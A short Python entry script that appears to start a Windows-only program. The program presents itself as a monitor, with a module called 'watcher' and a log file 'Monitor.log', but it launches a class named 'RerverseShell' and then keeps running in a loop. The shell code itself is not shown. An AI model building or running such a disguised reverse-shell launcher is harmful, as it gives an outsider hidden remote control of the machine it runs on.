import logging
import time
import platform
from utils.watcher import RerverseShell


if __name__ == "__main__":
    if platform.system() != "Windows":
        print("This program is designed to run on Windows.")
        exit(1)
    
    logging.basicConfig(filename='Monitor.log', level=logging.INFO, format='%(asctime)s - %(message)s')

    RerverseShell().initialize()



    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting...")